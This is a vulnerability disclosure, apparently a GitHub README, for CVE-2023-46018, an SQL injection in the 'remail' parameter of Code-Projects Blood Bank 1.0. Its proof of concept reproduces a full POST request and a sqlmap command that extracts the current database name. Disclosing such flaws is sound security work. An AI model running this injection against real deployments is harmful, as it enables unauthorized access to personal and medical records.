# CVE-2023-46018-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability
+ Exploit Author: ersinerenler
# Vendor Homepage
+ https://code-projects.org/blood-bank-in-php-with-source-code
# Software Link
+ https://download-media.code-projects.org/2020/11/Blood_Bank_In_PHP_With_Source_code.zip
# Overview
+ Code-Projects Blood Bank V1.0 is susceptible to a significant security vulnerability that arises from insufficient protection on the 'remail' parameter in the receiverReg.php file. This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database.
# Vulnerability Details
+ CVE ID: CVE-2023-46018
+ Affected Version: Blood Bank V1.0
+ Vulnerable File: /receiverReg.php
+ Parameter Name: remail
+ Attack Type: Local
# References:
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46018
+ https://nvd.nist.gov/vuln/detail/CVE-2023-46018
# Description
+ The lack of proper input validation and sanitization on the 'remail' parameter allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database


<img width="1113" alt="image" src="https://github.com/ersinerenler/CVE-2023-46018-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability/assets/113091631/926fd161-9614-4fa0-b904-4195f4b71181">

# Proof of Concept (PoC) : 
+ Save the POST request of receiverReg.php to a request.txt file.
```
---
POST /bloodbank/file/receiverReg.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------2653697510272605730288393868
Content-Length: 877
Origin: http://localhost
Connection: close
Referer: http://localhost/bloodbank/register.php
Cookie: PHPSESSID=<some-cookie-value>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------2653697510272605730288393868
Content-Disposition: form-data; name="rname"

test
-----------------------------2653697510272605730288393868
Content-Disposition: form-data; name="rbg"

A+
-----------------------------2653697510272605730288393868
Content-Disposition: form-data; name="rcity"

test
-----------------------------2653697510272605730288393868
Content-Disposition: form-data; name="rphone"

05555555555
-----------------------------2653697510272605730288393868
Content-Disposition: form-data; name="remail"

test@test
-----------------------------2653697510272605730288393868
Content-Disposition: form-data; name="rpassword"

test123
-----------------------------2653697510272605730288393868
Content-Disposition: form-data; name="rregister"

Register
-----------------------------2653697510272605730288393868--

---
```
+ `sqlmap -r request.txt -p remail --risk 3 --level 3 --dbms mysql --batch --current-db`

+ current database: `bloodbank`
<img width="750" alt="image" src="https://github.com/ersinerenler/CVE-2023-46018-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability/assets/113091631/c10d2155-b810-40c5-b079-88d4c8088850">
